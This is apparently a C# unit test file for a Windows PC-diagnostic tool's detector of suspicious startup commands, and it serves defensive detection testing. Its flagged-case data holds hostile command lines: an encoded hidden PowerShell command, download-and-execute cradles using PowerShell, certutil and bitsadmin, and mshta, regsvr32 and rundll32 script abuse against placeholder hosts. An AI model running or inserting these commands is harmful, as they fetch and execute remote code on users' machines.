using Xunit;
using PcDoctor.Core.Findings;
using PcDoctor.Core.Platform;
using PcDoctor.Modules.Persistence;

namespace PcDoctor.Tests.Modules;

/// <summary>A labelled set of startup command lines: ones that must be flagged, and ordinary ones that must not be.</summary>
public class SuspiciousCommandTests
{
    [Theory]
    [InlineData(@"powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", "encoded")]
    [InlineData(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')""", "download")]
    [InlineData(@"mshta.exe http://example.invalid/x.hta", "mshtaScript")]
    [InlineData(@"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"calc"""", 0:close"")", "mshtaScript")]
    [InlineData(@"regsvr32.exe /s /n /u /i:http://example.invalid/file.sct scrobj.dll", "regsvr32Script")]
    [InlineData(@"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";alert(1)", "rundll32Script")]
    [InlineData(@"cmd.exe /c certutil -urlcache -split -f http://example.invalid/p.exe %TEMP%\p.exe & %TEMP%\p.exe", "download")]
    [InlineData(@"certutil.exe -decode C:\Users\Public\a.txt C:\Users\Public\a.exe", "decode")]
    [InlineData(@"bitsadmin /transfer job /download /priority high http://example.invalid/a.exe C:\Users\Public\a.exe", "download")]
    [InlineData(@"wscript.exe ""C:\Users\Sam\AppData\Roaming\updater.vbs""", "userFolder")]
    [InlineData(@"msiexec /q /i https://example.invalid/setup.msi", "remoteInstall")]
    [InlineData(@"pwsh -c ""[System.Convert]::FromBase64String('AAAA') | iex""", "encoded")]
    public void Abuse_of_built_in_tools_is_flagged_with_its_reason(string command, string expected) =>
        Assert.Contains(SuspiciousCommand.Reasons(command), r => r.Code == expected);

    [Theory]
    [InlineData(@"""C:\Program Files\Windows Defender\MSASCuiL.exe""")]
    [InlineData(@"C:\Windows\System32\SecurityHealthSystray.exe")]
    [InlineData(@"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background")]
    [InlineData(@"C:\Windows\system32\rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL")]
    [InlineData(@"""C:\Program Files\NVIDIA Corporation\NvContainer\nvcontainer.exe"" -s NvContainerLocalSystem")]
    [InlineData(@"C:\Windows\System32\cmd.exe /c ""C:\Program Files\Vendor\start.bat""")]
    [InlineData(@"powershell.exe -ExecutionPolicy RemoteSigned -File ""C:\Program Files\Vendor\task.ps1""")]
    [InlineData(@"C:\Windows\System32\msiexec.exe /V")]
    [InlineData(@"C:\Windows\System32\cmdkey.exe /list")]
    [InlineData(@"C:\Tools\mycmd\app.exe --encode -w hidden")]
    [InlineData(@"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --no-startup-window https://example.invalid/")]
    [InlineData(@"regsvr32.exe /s ""C:\Program Files\Vendor\plugin.dll""")]
    [InlineData("")]
    [InlineData(null)]
    public void Ordinary_startup_commands_are_not_flagged(string? command) =>
        Assert.Empty(SuspiciousCommand.Reasons(command));

    [Fact]
    public void A_microsoft_signed_interpreter_with_an_encoded_hidden_command_is_a_high_finding()
    {
        var entry = new AutorunEntry
        {
            Category = AutorunCategory.RunKey,
            Location = @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            Name = "Updater",
            Command = @"powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
            Image = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            Signature = new SignatureInfo(SignatureStatus.MicrosoftSigned, "Microsoft Windows", true, null),
        };
        var finding = Assert.Single(PersistenceAnalyzer.Analyze(new PersistenceSnapshot { Entries = [entry], VirusTotalEnabled = true }).Findings);
        Assert.StartsWith("M3.lolbin.", finding.Id);
        Assert.Equal(Severity.High, finding.Severity);
        Assert.Contains(finding.Evidence, e => e.Label == "Why flagged" && e.Value.Contains("encoded"));
    }

    [Fact]
    public void A_startup_shortcut_is_judged_by_its_arguments_too()
    {
        var entry = new AutorunEntry
        {
            Category = AutorunCategory.StartupFolder,
            Location = @"C:\Users\Sam\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Sync.lnk",
            Name = "Sync",
            Command = @"""C:\Windows\System32\mshta.exe"" http://example.invalid/x.hta",
            Image = @"C:\Windows\System32\mshta.exe",
            Signature = new SignatureInfo(SignatureStatus.MicrosoftSigned, "Microsoft Windows", true, null),
        };
        Assert.Contains(PersistenceAnalyzer.Analyze(new PersistenceSnapshot { Entries = [entry], VirusTotalEnabled = true }).Findings, f => f.Id.StartsWith("M3.lolbin."));
    }

    [Fact]
    public void An_accessibility_tool_whose_signature_could_not_be_checked_is_not_a_critical_alarm()
    {
        var entry = new AutorunEntry
        {
            Category = AutorunCategory.Accessibility,
            Location = @"C:\Windows\System32",
            Name = "sethc.exe",
            Image = @"C:\Windows\System32\sethc.exe",
            Signature = new SignatureInfo(SignatureStatus.Error, null, false, "0x800B0100"),
        };
        Assert.DoesNotContain(PersistenceAnalyzer.Analyze(new PersistenceSnapshot { Entries = [entry], VirusTotalEnabled = true }).Findings, f => f.Severity == Severity.Critical);
    }
}
